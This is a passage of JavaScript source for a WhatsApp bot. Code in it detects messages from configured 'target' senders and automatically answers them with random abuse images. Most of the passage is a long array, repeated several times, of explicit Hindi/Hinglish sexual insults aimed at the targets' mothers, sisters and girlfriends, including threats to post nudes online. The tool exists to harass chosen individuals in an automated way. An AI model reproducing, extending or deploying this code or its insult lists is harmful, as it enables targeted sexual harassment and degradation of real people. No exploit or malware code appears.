XeonBotInc.sendMessage(m.chat, { image: hasil }, { quoted: m })
        }
        if (m.sender.startsWith(`${global.target4}`)){ 
var notnot = JSON.parse(fs.readFileSync('./gali/pic.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { image: hasil }, { quoted: m })
        }        
        if (m.sender.startsWith(`${global.target5}`)){ 
var notnot = JSON.parse(fs.readFileSync('./gali/pic.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { image: hasil }, { quoted: m })
        }

const papadev = [
'TERI MA KA BHOSDA MARU','TERI MA KI CHUT MARU','TERI MA CHAKA HAI','TERI MA CHAKA HAI','TERI MA MADARCHOD HAI MA KE LODE','TERI MA MADARCHOD HAI','TERI MA MADARCHOD HAI','TERI MA MADARCHOD HAI ','TERI MA GANDU ORAT',
  "HA TU WHI HAI NA JISKJ MA SABZI BECHA KRTI THI",
  "HA TERI MA WHI HAI JO BLACK ME CHUT DETI THI",
    "TERI MA KO LODA DEKE BHAGA DU",
      "TERI MA SHADI KRKE AYI",
        "TERI MA LODA PE",
          "TERI MA CHAKA HAI",
            "TERI MA GANDU KI BACCHI",
              "TERI MA LUND CHATU",
    "TERI MA KI CHUT PE HASTA HUN😂",
      "TERI MA KI SUHGARTA MANA DU😳",
        "TERI MA KI SUHGARTA MANA DU😳",
          "TERI MA KA BLOUSE FAD DU😝❤️",
            "TERI MA KA DIL TOD DU❤️😝",
              "TERI MA KA DIL CHURA LU😝❤️",
    "TERI MA KA DIL KACHRE ME FEK DU❤️",
      "TERI MA RANDI KI BACCHI❤️❤️",
        "TERI MA RANDI KI BACCHI❤️❤️",
          "TERI MA MADARCHOD KI BACCHI HAI MA KE LODE 😂",
            "BEHEN KE LODE TERI MA GANDU😂",
              "MA KE LODE TERI MA CHAKA HAI😗",
    "CHAKE KE BACHE TERK MA KO KIS DU",
      "MADARCHOD KE BACHE TERI MA RANDI HAI",
        "TERI MA CHUWALE MERSE BEHEN KE LODE😗",
          "MA KE JANE TERI MA RANDJ KESE BAN GYI",
            "BEHEN KE LPDE TERI MA KI CHUT PE VIMAL KA PICHKARI MARU😝",
              "BEHEN KE LPDE TERI MA KI CHUT PE VIMAL KA PICHKARI MARU😝",
    "VIMAL KHANE WALI RANDI TERI MA😝",
      "TERI MA KO BODYGURAR KE ROOP PE CHOODU",
        "RANDI KA BACCHA HAI TU😝",
          "SLOW TYPE KREGA MA KE LODE",
            "BEHEN KE LODE ROYA TO TERI MA RANDII😝😝",
              "BHAGA TO TERI MA CHAKA HOGA😝",
    "TERI MA KI SHADI TUTWA DUNGA AJR",
      "TERI MA KO LODA DEKE KHUSH KRU😝",
        "TERI MA KI KACCHA BADAM KA OFFER LU😝",
          "TERI MA KI CHUT PE THA D DALU😝",
            "TERI MA KI CHUT PE THAPPAD MARU😝",
              "TERI MA KA BHOSDA LAAT MARKE SUJA DU😝",
    "TERI MA CHAKE KI BACCHI THIE",
      "TERI MA LUND CHATU THI😝",
        "MA KI LODI THI TERI RANDI MA😝",
          "RANDI KA BACCHA THA TU MA KE LODE 😝",
            "T3R1 M99 K99 BH0SD9 J9L9 DU B3H3N K3 L0D3",
              "B4H3N K3 L0D3 T3R1 M99 CH9K9 K1U H91",
    "T3R1 M9 K11 CHU7 P3 L0D9 M99RU KI1",
      "T3R1 M99 CL1P B0LK3 R00 N99 D33 B9S",
        "T3R1 CH9K1 M99 K99 BH0SD9 D33 MUZH3",
          "T3R1 R9ND1 M99 K11 CHU7 P3 K1SS DU",
            "R9ND1 K3 B9CH3 M99 K3 L0D3 T3R1 M99 G99NDU H91",
              "T3R1 M9 K1 CHU7 P3 P99N K1 P1CHK99R1 M99RU",
    "R9ND1 K3 B9CH3 T3R1 M99 L0D1 TH1",
      "B3H3N K3 L0D3 T3R1 CH9K1 M99 K99 BH0SD9 J9L9 DU😂😂😂😂😂",
        "M99 K3 L0D3 T3R1 M99 K00 CH9K9 B9N9 DU",
          "CH9K1 H91 T3R1 R9ND1 M99",
  "TERI MA KI CHUT MARU",
"BAHEN K LAVDE",
"TU APNI MA Q CHUDA RAHA HAI",
"TERI MA K CHUT PE THAPPAD MARU",
"KYA BE GB ROAD WALE RANDI KA BETA",
"AABB KYA TU APNI MA CHUDAYEGA YAHA",
"BAHENCHOD TERE BAAP HAI HAM",
"TERI RANDI MA K CHUT PE NIMBU NICHODU",
"BHAG JA BHOSADIKE",
"AABB 😜 TERI MA KALAP GAI KYA",
"TERI RANDI MA 😁😙 CHUD GAI",
"BAHENCHOD TERI MA 😬 KO CHOD DUNGA",
"TERI BAHEN K CHUT ME 🍼 LAVA DAAL DU",
"KYA 💩 BE CHHAKE",
"TERI BAHEN 😂 KO GANNE K KHET ME CHODU",
"APNI MA KO BHEJ NANGA 🥺🥵 KARKE GHUMAUNGA",
"RANDI K AULAD SALE",
"TERI GIRLFRIEND KO NANGA 🤧🤣 GHUMAUNGA",
"GB ROAD K RANDI TERI MA 😂",
"KYA BE CHHAKE KI AULAD",
"TERI MA KO CHODNEE MAZA AATA HAI 🥵",
"TERI AMMY KA CH00T KITNA 😂 CHHOTA HAI RE KAISE😂  BAHAR AYA TU ?",
"JB MAI TERI😂 AMMY KE GQND MEI 😂 LQND DALNE GYA TOH MERA 😂LQND HI MUD GYA",
"TERI AMMY BAHUT 😂JAANDAAR HAI SALI😂 CHILLAI TAK NAHI😂 JB MAINE USKE SATH ANQL KIYA",
" 4 ,4 C0ND0M.😂USE KIYA EK DIN 😂MEI TERI CHHOTI😂 BEHN PE",
" BUKHAR HOTE 😂 HUYE PELA TERI😂 BEHN KO",
"CHALTI SADAK😂 PE TERI AMMY KE MUH😂 MEI DE DETA 😂HUN MAI ",
"TERI BEHN JIS 😂HOSTLE MEI REHTI N 😂USKA ROJ DEEWAL 😂KUDATTA HUN MAI",
"TERI BEHN 😂MERE KACHHE KO APNA 😂 MASK SAMAJH KE PEHNTI HAI",
"BILLICH0DE SALE😂BAAP SE GQNDM@STI 😂KREGA TU",
"APNI BUA KO 😂SAMJHA DE WARNA 😂 😂AISA KEENCH KE THAPPAD MARUNGA M@R JAYEGI😂 SAALI BAHUT UCHHALTI",
"TERI  😂 AMMY KE BHOXDE 😂  MEI PUNCHING 😂  MACHINE SE PUNCH 😂  KR DUNGA",
" MPL KHEL  😂 KHEL KE TERI  😂 AMMY KO PELUNGA",
"BEEHAD KE  😂 PAHADO MEI LEJAKR  😂  TERE PURE KHANDAN SE 😂  R@NDI KAA NAACH KRWAUNGA",
"PARAGLIDING KRTE  😂 HUYE TERI WIFE KO  😂 PELUNGA KACHAKACH",
"MICKKY MAUSE  😂 KI CHHATI AULAAD  😂 BSD KE",
"TERE G@ND 😂 MEI JO CHHED HAI N 😂  USKO FAAD KE GUFA 😂 BANA DUNGA AUKAAD  😂 SE BAHAR GYA TOH",
"THANDI MEI AAG JALA 😂  KE USKE UPAR BED 😂  LAGA KE TERI  😂 BEHN KO CH0DUNGA",
"APNE JH@NT KA 😂  JUICE  PILAUNGA  😂 TERI  AMMY KO",
" TERI AMMY KO BELAN  😂 USE KRTE HUYE PAKDA 😂  THA MAINE EK DIN BOLTI HAI 😂  KYA KRU DILD0 KHARIDNE  😂 KA PAISA NI TOH MAI  😂 BOLA MERA SUDOL L@ND HAI N YE LO",
"CHHENI HATHORI  😂 SE TERI AMMY KA 😂  CH00T PHOD DUNGA",
"CRYPTO 😂 CURRENCY SE TERI😂 AMMY KO KHARID 😂 KE CH0DUNGA",
"CH00CHIDHARI 😂 NARI KE NAZAYAZ 😂 AULAAD",
"NANGA LETA😂 KE TUJHE TERE 😂 😂 G@ND PE BIKE KA SILENCER😂 DAAL DUNGA",
"KEKDA CHOR😂 DUNGA TERE BAAP KE G@ND😂 ME",
"BICHHU KE😂 DANK SE PAIDA😂 HUA CHACHUNDAR 😂HAI TU",
"APNE JH@NT KA 😂TABIJ BNA KE PEHNAUNGA 😂 TUJHE",
"TERI AMMY KE 😂 MOULIK ADHIKAR KI MA 😂 CH0D DUNGA",
"KHUNI BAWASIR😂 KE PAIDAIS BSD K",
"LACHATAHE 😂 M@DHAR CH0D",
"TERI GF KO SINGING KRNE 😂KA BAHUT SHOKH HAI DIN RAAT 😂 MERE MIC KO MUH ME LAGAI 😂 REHTI HAI",
'TERI MA KA BHOSDA MARU','TERI MA KI CHUT MARU','TERI MA CHAKA HAI','TERI MA CHAKA HAI','TERI MA MADARCHOD HAI MA KE LODE','TERI MA MADARCHOD HAI','TERI MA MADARCHOD HAI','TERI MA MADARCHOD HAI ','TERI MA GANDU ORAT',
  "HA TU WHI HAI NA JISKJ MA SABZI BECHA KRTI THI",
  "HA TERI MA WHI HAI JO BLACK ME CHUT DETI THI",
    "TERI MA KO LODA DEKE BHAGA DU",
      "TERI MA SHADI KRKE AYI",
        "TERI MA LODA PE",
          "TERI MA CHAKA HAI",
            "TERI MA GANDU KI BACCHI",
              "TERI MA LUND CHATU",
    "TERI MA KI CHUT PE HASTA HUN😂",
      "TERI MA KI SUHGARTA MANA DU😳",
        "TERI MA KI SUHGARTA MANA DU😳",
          "TERI MA KA BLOUSE FAD DU😝❤️",
            "TERI MA KA DIL TOD DU❤️😝",
              "TERI MA KA DIL CHURA LU😝❤️",
    "TERI MA KA DIL KACHRE ME FEK DU❤️",
      "TERI MA RANDI KI BACCHI❤️❤️",
        "TERI MA RANDI KI BACCHI❤️❤️",
          "TERI MA MADARCHOD KI BACCHI HAI MA KE LODE 😂",
            "BEHEN KE LODE TERI MA GANDU😂",
              "MA KE LODE TERI MA CHAKA HAI😗",
    "CHAKE KE BACHE TERK MA KO KIS DU",
      "MADARCHOD KE BACHE TERI MA RANDI HAI",
        "TERI MA CHUWALE MERSE BEHEN KE LODE😗",
          "MA KE JANE TERI MA RANDJ KESE BAN GYI",
            "BEHEN KE LPDE TERI MA KI CHUT PE VIMAL KA PICHKARI MARU😝",
              "BEHEN KE LPDE TERI MA KI CHUT PE VIMAL KA PICHKARI MARU😝",
    "VIMAL KHANE WALI RANDI TERI MA😝",
      "TERI MA KO BODYGURAR KE ROOP PE CHOODU",
        "RANDI KA BACCHA HAI TU😝",
          "SLOW TYPE KREGA MA KE LODE",
            "BEHEN KE LODE ROYA TO TERI MA RANDII😝😝",
              "BHAGA TO TERI MA CHAKA HOGA😝",
    "TERI MA KI SHADI TUTWA DUNGA AJR",
      "TERI MA KO LODA DEKE KHUSH KRU😝",
        "TERI MA KI KACCHA BADAM KA OFFER LU😝",
          "TERI MA KI CHUT PE THA D DALU😝",
            "TERI MA KI CHUT PE THAPPAD MARU😝",
              "TERI MA KA BHOSDA LAAT MARKE SUJA DU😝",
    "TERI MA CHAKE KI BACCHI THIE",
      "TERI MA LUND CHATU THI😝",
        "MA KI LODI THI TERI RANDI MA😝",
          "RANDI KA BACCHA THA TU MA KE LODE 😝",
            "T3R1 M99 K99 BH0SD9 J9L9 DU B3H3N K3 L0D3",
              "B4H3N K3 L0D3 T3R1 M99 CH9K9 K1U H91",
    "T3R1 M9 K11 CHU7 P3 L0D9 M99RU KI1",
      "T3R1 M99 CL1P B0LK3 R00 N99 D33 B9S",
        "T3R1 CH9K1 M99 K99 BH0SD9 D33 MUZH3",
          "T3R1 R9ND1 M99 K11 CHU7 P3 K1SS DU",
            "R9ND1 K3 B9CH3 M99 K3 L0D3 T3R1 M99 G99NDU H91",
              "T3R1 M9 K1 CHU7 P3 P99N K1 P1CHK99R1 M99RU",
    "R9ND1 K3 B9CH3 T3R1 M99 L0D1 TH1",
      "B3H3N K3 L0D3 T3R1 CH9K1 M99 K99 BH0SD9 J9L9 DU😂😂😂😂😂",
        "M99 K3 L0D3 T3R1 M99 K00 CH9K9 B9N9 DU",
          "CH9K1 H91 T3R1 R9ND1 M99",
  "TERI MA KI CHUT MARU",
"BAHEN K LAVDE",
"TU APNI MA Q CHUDA RAHA HAI",
"TERI MA K CHUT PE THAPPAD MARU",
"KYA BE GB ROAD WALE RANDI KA BETA",
"AABB KYA TU APNI MA CHUDAYEGA YAHA",
"BAHENCHOD TERE BAAP HAI HAM",
"TERI RANDI MA K CHUT PE NIMBU NICHODU",
"BHAG JA BHOSADIKE",
"AABB 😜 TERI MA KALAP GAI KYA",
"TERI RANDI MA 😁😙 CHUD GAI",
"BAHENCHOD TERI MA 😬 KO CHOD DUNGA",
"TERI BAHEN K CHUT ME 🍼 LAVA DAAL DU",
"KYA 💩 BE CHHAKE",
"TERI BAHEN 😂 KO GANNE K KHET ME CHODU",
"APNI MA KO BHEJ NANGA 🥺🥵 KARKE GHUMAUNGA",
"RANDI K AULAD SALE",
"TERI GIRLFRIEND KO NANGA 🤧🤣 GHUMAUNGA",
"GB ROAD K RANDI TERI MA 😂",
"KYA BE CHHAKE KI AULAD",
"TERI MA KO CHODNEE MAZA AATA HAI 🥵",
"TERI AMMY KA CH00T KITNA 😂 CHHOTA HAI RE KAISE😂  BAHAR AYA TU ?",
"JB MAI TERI😂 AMMY KE GQND MEI 😂 LQND DALNE GYA TOH MERA 😂LQND HI MUD GYA",
"TERI AMMY BAHUT 😂JAANDAAR HAI SALI😂 CHILLAI TAK NAHI😂 JB MAINE USKE SATH ANQL KIYA",
" 4 ,4 C0ND0M.😂USE KIYA EK DIN 😂MEI TERI CHHOTI😂 BEHN PE",
" BUKHAR HOTE 😂 HUYE PELA TERI😂 BEHN KO",
"CHALTI SADAK😂 PE TERI AMMY KE MUH😂 MEI DE DETA 😂HUN MAI ",
"TERI BEHN JIS 😂HOSTLE MEI REHTI N 😂USKA ROJ DEEWAL 😂KUDATTA HUN MAI",
"TERI BEHN 😂MERE KACHHE KO APNA 😂 MASK SAMAJH KE PEHNTI HAI",
"BILLICH0DE SALE😂BAAP SE GQNDM@STI 😂KREGA TU",
"APNI BUA KO 😂SAMJHA DE WARNA 😂 😂AISA KEENCH KE THAPPAD MARUNGA M@R JAYEGI😂 SAALI BAHUT UCHHALTI",
"TERI  😂 AMMY KE BHOXDE 😂  MEI PUNCHING 😂  MACHINE SE PUNCH 😂  KR DUNGA",
" MPL KHEL  😂 KHEL KE TERI  😂 AMMY KO PELUNGA",
"BEEHAD KE  😂 PAHADO MEI LEJAKR  😂  TERE PURE KHANDAN SE 😂  R@NDI KAA NAACH KRWAUNGA",
"PARAGLIDING KRTE  😂 HUYE TERI WIFE KO  😂 PELUNGA KACHAKACH",
"MICKKY MAUSE  😂 KI CHHATI AULAAD  😂 BSD KE",
"TERE G@ND 😂 MEI JO CHHED HAI N 😂  USKO FAAD KE GUFA 😂 BANA DUNGA AUKAAD  😂 SE BAHAR GYA TOH",
"THANDI MEI AAG JALA 😂  KE USKE UPAR BED 😂  LAGA KE TERI  😂 BEHN KO CH0DUNGA",
"APNE JH@NT KA 😂  JUICE  PILAUNGA  😂 TERI  AMMY KO",
" TERI AMMY KO BELAN  😂 USE KRTE HUYE PAKDA 😂  THA MAINE EK DIN BOLTI HAI 😂  KYA KRU DILD0 KHARIDNE  😂 KA PAISA NI TOH MAI  😂 BOLA MERA SUDOL L@ND HAI N YE LO",
"CHHENI HATHORI  😂 SE TERI AMMY KA 😂  CH00T PHOD DUNGA",
"CRYPTO 😂 CURRENCY SE TERI😂 AMMY KO KHARID 😂 KE CH0DUNGA",
"CH00CHIDHARI 😂 NARI KE NAZAYAZ 😂 AULAAD",
"NANGA LETA😂 KE TUJHE TERE 😂 😂 G@ND PE BIKE KA SILENCER😂 DAAL DUNGA",
"KEKDA CHOR😂 DUNGA TERE BAAP KE G@ND😂 ME",
"BICHHU KE😂 DANK SE PAIDA😂 HUA CHACHUNDAR 😂HAI TU",
"APNE JH@NT KA 😂TABIJ BNA KE PEHNAUNGA 😂 TUJHE",
"TERI AMMY KE 😂 MOULIK ADHIKAR KI MA 😂 CH0D DUNGA",
"KHUNI BAWASIR😂 KE PAIDAIS BSD K",
"LACHATAHE 😂 M@DHAR CH0D",
"TERI GF KO SINGING KRNE 😂KA BAHUT SHOKH HAI DIN RAAT 😂 MERE MIC KO MUH ME LAGAI 😂 REHTI HAI",
'TERI MA KA BHOSDA MARU','TERI MA KI CHUT MARU','TERI MA CHAKA HAI','TERI MA CHAKA HAI','TERI MA MADARCHOD HAI MA KE LODE','TERI MA MADARCHOD HAI','TERI MA MADARCHOD HAI','TERI MA MADARCHOD HAI ','TERI MA GANDU ORAT',
  "HA TU WHI HAI NA JISKJ MA SABZI BECHA KRTI THI",
  "HA TERI MA WHI HAI JO BLACK ME CHUT DETI THI",
    "TERI MA KO LODA DEKE BHAGA DU",
      "TERI MA SHADI KRKE AYI",
        "TERI MA LODA PE",
          "TERI MA CHAKA HAI",
            "TERI MA GANDU KI BACCHI",
              "TERI MA LUND CHATU",
              "TERI MAA KI CHUT KAKTE 🤱 GALI KE KUTTO 🦮 ME BAAT DUNGA PHIR 🍞 BREAD KI TARH KHAYENGE WO TERI MAA KI CHUT",
              "ARE RE MERE BETE KYOUN SPEED PAKAD NA PAAA RAHA APNE BAAP KA HAHAH🤣🤣",
              "TERI BEHEN KE BHOSDE ME AAAG LAGADIA MERA MOTA LUND DALKE 🔥🔥💦😆😆",
              "TERI MAA KI CHUT ME ✋ HATTH DALKE 👶 BACCHE NIKAL DUNGA 😍",
              "TOHAR BAHIN CHODU BBAHEN KE LAWDE USME MITTI DAL KE CEMENT SE BHAR DU 🏠🤢🤩💥",
              "TERI RANDI MAA SE PUCHNA BAAP KA NAAM BAHEN KE LODEEEEE 🤩🥳😳",
              "TERI MAA KA YAAR HU MEI AUR TERI BAHEN KA PYAAR HU MEI AJA MERA LAND CHOOS LE 🤩🤣💥",
              "TERI MAA KO REDI PE BAITHAL KE USSE USKI CHUT BILWAUNGAA 💰 😵🤩",
              "TERI BAHEN KI CHUT KO AMAZON SE ORDER KARUNGA 10 rs MEI AUR FLIPKART PE 20 RS MEI BECH DUNGA🤮👿😈🤖",
              "TERI MAA KA GROUP VAALON SAATH MILKE GANG BANG KRUNGA🙌🏻☠️",
              "ABE TERI BEHEN KO CHODU RANDIKE BACHHE TEREKO CHAKKO SE PILWAVUNGA RANDIKE BACHHE 🤣🤣",
              "TERI BEHN KI CHUT ME KELE KE CHILKE 🤤🤤",
              "HAHAHAHA BACHHE TERI MAAAKO CHOD DIA NANGA KARKE",
              "TERI CHUT KI CHUT MEI SHOULDERING KAR DUNGAA HILATE HUYE BHI DARD HOGAAA😱🤮👺",
              "TERI MAA KI CHUT ALEXA DAL KEE DJ BAJAUNGAAA 🎶 ⬆️🤩💥",
              "JUNGLE ME NACHTA HE MORE TERI MAAKI CHUDAI DEKKE SAB BOLTE ONCE MORE ONCE MORE 🤣🤣💦💋",
              "2 RUPAY KI PEPSI TERI MUMMY SABSE SEXY 💋💦",
              "TERI MAAKI CHUTH FAADKE RAKDIA MAAKE LODE JAA ABB SILWALE 👄👄",
              "TERI MAA KI GAAND ME SARIYA DAAL DUNGA MADARCHOD USI SARIYE PR TANG KE BACHE PAIDA HONGE 😱😱",
              "TERI MAA KO ITNA CHODUNGA TERA BAAP BHI USKO PAHCHANANE SE MANA KAR DEGA😂👿🤩",
              "TERI VAHEN KE BHOSDIKE MEI BESAN KE LADDU BHAR DUNGA🤩🥳🔥😈",
              "ABE TERI BEHEN KO CHODU RANDIKE BACHHE TEREKO CHAKKO SE PILWAVUNGA RANDIKE BACHHE 🤣🤣",
              "TERI MAA KE BHOSDA ITNA CHODUNGA KI TU CAH KE BHI WO MAST CHUDAI SE DUR NHI JA PAYEGAA 😏😏🤩😍",
              "TERI MAA KI CHUT ME CHANGES COMMIT KRUGA FIR TERI BHEEN KI CHUT AUTOMATICALLY UPDATE HOJAAYEGI🤖🙏🤔",
              "TERI BAHEN KI CHUT MEI BARGAD KA PED UGA DUNGAA CORONA MEI SAB OXYGEN LEKAR JAYENGE🤢🤩🥳",
              "TU TERI BAHEN TERA KHANDAN SAB BAHEN KE LAWDE RANDI HAI RANDI 🤢✅🔥",
              "TERI MAA KI CHUT MEI C++ STRING ENCRYPTION LAGA DUNGA BAHTI HUYI CHUT RUK JAYEGIIII😈🔥😍",
              "TERI MAAAKE NUDES GOOGLE PE UPLOAD KARDUNGA BEHEN KE LAEWDE 👻🔥",
              "TERI MUMMY KI CHUT KO ONLINE OLX PE BECHUNGA AUR PAISE SE TERI BAHEN KA KOTHA KHOL DUNGA 😎🤩😝😍",
              "TERI MAA KI CHUT MEI BATTERY LAGA KE POWERBANK BANA DUNGA 🔋 🔥🤩",
              "HAHAHAH MERE BETE AGLI BAAR APNI MAAKO LEKE AAYA MATH KAT OR MERE MOTE LUND SE CHUDWAYA MATH KAR",
              "TERI MAA KE BHOSDE MEI GITHUB DAL KE APNA BOT HOST KARUNGAA 🤩👊👤😍",
              "TERI GF KO ETNA CHODA BEHEN KE LODE TERI GF TO MERI RANDI BANGAYI ABB CHAL TERI MAAKO CHODTA FIRSE ♥️💦😆😆😆😆",
              "TERI VAHEEN KO APNE LUND PR ITNA JHULAAUNGA KI JHULTE JHULTE HI BACHA PAIDA KR DEGI👀👯",
              "TERI MAUSI KE BHOSDE MEI INDIAN RAILWAY 🚂💥😂",
              "TERI BEHEN KO CHOD CHODKE VIDEO BANAKE XNXX.COM PE NEELAM KARDUNGA KUTTE KE PILLE 💦💋",
              "JUNGLE ME NACHTA HE MORE TERI MAAKI CHUDAI DEKKE SAB BOLTE ONCE MORE ONCE MORE 🤣🤣💦💋",
              "TERI MAA KI CHUT KHOD KE USME CYLINDER ⛽️ FIT KARKE USMEE DAL MAKHANI BANAUNGAAA🤩👊🔥",
              "TERI MUMMY KI CHUT MEI TERE LAND KO DAL KE KAAT DUNGA MADARCHOD 🔪😂🔥",
              "DUDH HILAAUNGA TERI VAHEEN KE UPR NICHE 🆙🆒😙",
              "APNI AMMA SE PUCHNA USKO US KAALI RAAT MEI KAUN CHODNEE AYA THAAA! TERE IS PAPA KA NAAM LEGI 😂👿😳",
    "TERI MA KI CHUT PE HASTA HUN😂",
      "TERI MA KI SUHGARTA MANA DU😳",
        "TERI MA KI SUHGARTA MANA DU😳",
          "TERI MA KA BLOUSE FAD DU😝❤️",
            "TERI MA KA DIL TOD DU❤️😝",
              "TERI MA KA DIL CHURA LU😝❤️",
    "TERI MA KA DIL KACHRE ME FEK DU❤️",
      "TERI MA RANDI KI BACCHI❤️❤️",
        "TERI MA RANDI KI BACCHI❤️❤️",
          "TERI MA MADARCHOD KI BACCHI HAI MA KE LODE 😂",
            "BEHEN KE LODE TERI MA GANDU😂",
              "MA KE LODE TERI MA CHAKA HAI😗",
    "CHAKE KE BACHE TERK MA KO KIS DU",
      "MADARCHOD KE BACHE TERI MA RANDI HAI",
        "TERI MA CHUWALE MERSE BEHEN KE LODE😗",
          "MA KE JANE TERI MA RANDJ KESE BAN GYI",
            "BEHEN KE LPDE TERI MA KI CHUT PE VIMAL KA PICHKARI MARU😝",
              "BEHEN KE LPDE TERI MA KI CHUT PE VIMAL KA PICHKARI MARU😝",
    "VIMAL KHANE WALI RANDI TERI MA😝",
      "TERI MA KO BODYGURAR KE ROOP PE CHOODU",
        "RANDI KA BACCHA HAI TU😝",
          "SLOW TYPE KREGA MA KE LODE",
            "BEHEN KE LODE ROYA TO TERI MA RANDII😝😝",
              "BHAGA TO TERI MA CHAKA HOGA😝",
    "TERI MA KI SHADI TUTWA DUNGA AJR",
      "TERI MA KO LODA DEKE KHUSH KRU😝",
        "TERI MA KI KACCHA BADAM KA OFFER LU😝",
          "TERI MA KI CHUT PE THA D DALU😝",
            "TERI MA KI CHUT PE THAPPAD MARU😝",
              "TERI MA KA BHOSDA LAAT MARKE SUJA DU😝",
    "TERI MA CHAKE KI BACCHI THIE",
      "TERI MA LUND CHATU THI😝",
        "MA KI LODI THI TERI RANDI MA😝",
          "RANDI KA BACCHA THA TU MA KE LODE 😝",
            "T3R1 M99 K99 BH0SD9 J9L9 DU B3H3N K3 L0D3",
              "B4H3N K3 L0D3 T3R1 M99 CH9K9 K1U H91",
    "T3R1 M9 K11 CHU7 P3 L0D9 M99RU KI1",
      "T3R1 M99 CL1P B0LK3 R00 N99 D33 B9S",
        "T3R1 CH9K1 M99 K99 BH0SD9 D33 MUZH3",
          "T3R1 R9ND1 M99 K11 CHU7 P3 K1SS DU",
            "R9ND1 K3 B9CH3 M99 K3 L0D3 T3R1 M99 G99NDU H91",
              "T3R1 M9 K1 CHU7 P3 P99N K1 P1CHK99R1 M99RU",
    "R9ND1 K3 B9CH3 T3R1 M99 L0D1 TH1",
      "B3H3N K3 L0D3 T3R1 CH9K1 M99 K99 BH0SD9 J9L9 DU😂😂😂😂😂",
        "M99 K3 L0D3 T3R1 M99 K00 CH9K9 B9N9 DU",
          "CH9K1 H91 T3R1 R9ND1 M99",
  "TERI MA KI CHUT MARU",
"BAHEN K LAVDE",
"TU APNI MA Q CHUDA RAHA HAI",
"TERI MA K CHUT PE THAPPAD MARU",
"KYA BE GB ROAD WALE RANDI KA BETA",
"AABB KYA TU APNI MA CHUDAYEGA YAHA",
"BAHENCHOD TERE BAAP HAI HAM",
"TERI RANDI MA K CHUT PE NIMBU NICHODU",
"BHAG JA BHOSADIKE",
"AABB 😜 TERI MA KALAP GAI KYA",
"TERI RANDI MA 😁😙 CHUD GAI",
"BAHENCHOD TERI MA 😬 KO CHOD DUNGA",
"TERI BAHEN K CHUT ME 🍼 LAVA DAAL DU",
"KYA 💩 BE CHHAKE",
"TERI BAHEN 😂 KO GANNE K KHET ME CHODU",
"APNI MA KO BHEJ NANGA 🥺🥵 KARKE GHUMAUNGA",
"RANDI K AULAD SALE",
"TERI GIRLFRIEND KO NANGA 🤧🤣 GHUMAUNGA",
"GB ROAD K RANDI TERI MA 😂",
"KYA BE CHHAKE KI AULAD",
"TERI MA KO CHODNEE MAZA AATA HAI 🥵",
"TERI AMMY KA CH00T KITNA 😂 CHHOTA HAI RE KAISE😂  BAHAR AYA TU ?",
"JB MAI TERI😂 AMMY KE GQND MEI 😂 LQND DALNE GYA TOH MERA 😂LQND HI MUD GYA",
"TERI AMMY BAHUT 😂JAANDAAR HAI SALI😂 CHILLAI TAK NAHI😂 JB MAINE USKE SATH ANQL KIYA",
" 4 ,4 C0ND0M.😂USE KIYA EK DIN 😂MEI TERI CHHOTI😂 BEHN PE",
" BUKHAR HOTE 😂 HUYE PELA TERI😂 BEHN KO",
"CHALTI SADAK😂 PE TERI AMMY KE MUH😂 MEI DE DETA 😂HUN MAI ",
"TERI BEHN JIS 😂HOSTLE MEI REHTI N 😂USKA ROJ DEEWAL 😂KUDATTA HUN MAI",
"TERI BEHN 😂MERE KACHHE KO APNA 😂 MASK SAMAJH KE PEHNTI HAI",
"BILLICH0DE SALE😂BAAP SE GQNDM@STI 😂KREGA TU",
"APNI BUA KO 😂SAMJHA DE WARNA 😂 😂AISA KEENCH KE THAPPAD MARUNGA M@R JAYEGI😂 SAALI BAHUT UCHHALTI",
"TERI  😂 AMMY KE BHOXDE 😂  MEI PUNCHING 😂  MACHINE SE PUNCH 😂  KR DUNGA",
" MPL KHEL  😂 KHEL KE TERI  😂 AMMY KO PELUNGA",
"BEEHAD KE  😂 PAHADO MEI LEJAKR  😂  TERE PURE KHANDAN SE 😂  R@NDI KAA NAACH KRWAUNGA",
"PARAGLIDING KRTE  😂 HUYE TERI WIFE KO  😂 PELUNGA KACHAKACH",
"MICKKY MAUSE  😂 KI CHHATI AULAAD  😂 BSD KE",
"TERE G@ND 😂 MEI JO CHHED HAI N 😂  USKO FAAD KE GUFA 😂 BANA DUNGA AUKAAD  😂 SE BAHAR GYA TOH",
"THANDI MEI AAG JALA 😂  KE USKE UPAR BED 😂  LAGA KE TERI  😂 BEHN KO CH0DUNGA",
"APNE JH@NT KA 😂  JUICE  PILAUNGA  😂 TERI  AMMY KO",
" TERI AMMY KO BELAN  😂 USE KRTE HUYE PAKDA 😂  THA MAINE EK DIN BOLTI HAI 😂  KYA KRU DILD0 KHARIDNE  😂 KA PAISA NI TOH MAI  😂 BOLA MERA SUDOL L@ND HAI N YE LO",
"CHHENI HATHORI  😂 SE TERI AMMY KA 😂  CH00T PHOD DUNGA",
"CRYPTO 😂 CURRENCY SE TERI😂 AMMY KO KHARID 😂 KE CH0DUNGA",
"CH00CHIDHARI 😂 NARI KE NAZAYAZ 😂 AULAAD",
"NANGA LETA😂 KE TUJHE TERE 😂 😂 G@ND PE BIKE KA SILENCER😂 DAAL DUNGA",
"KEKDA CHOR😂 DUNGA TERE BAAP KE G@ND😂 ME",
"BICHHU KE😂 DANK SE PAIDA😂 HUA CHACHUNDAR 😂HAI TU",
"APNE JH@NT KA 😂TABIJ BNA KE PEHNAUNGA 😂 TUJHE",
"TERI AMMY KE 😂 MOULIK ADHIKAR KI MA 😂 CH0D DUNGA",
"KHUNI BAWASIR😂 KE PAIDAIS BSD K",
"LACHATAHE 😂 M@DHAR CH0D",
"TERI GF KO SINGING KRNE 😂KA BAHUT SHOKH HAI DIN RAAT 😂 MERE MIC KO MUH ME LAGAI 😂 REHTI HAI",
'TERI MA KA BHOSDA MARU','TERI MA KI CHUT MARU','TERI MA CHAKA HAI','TERI MA CHAKA HAI','TERI MA MADARCHOD HAI MA KE LODE','TERI MA MADARCHOD HAI','TERI MA MADARCHOD HAI','TERI MA MADARCHOD HAI ','TERI MA GANDU ORAT',
  "HA TU WHI HAI NA JISKJ MA SABZI BECHA KRTI THI",
  "HA TERI MA WHI HAI JO BLACK ME CHUT DETI THI",
    "TERI MA KO LODA DEKE BHAGA DU",
      "TERI MA SHADI KRKE AYI",
        "TERI MA LODA PE",
          "TERI MA CHAKA HAI",
            "TERI MA GANDU KI BACCHI",
              "TERI MA LUND CHATU",
    "TERI MA KI CHUT PE HASTA HUN😂",
      "TERI MA KI SUHGARTA MANA DU😳",
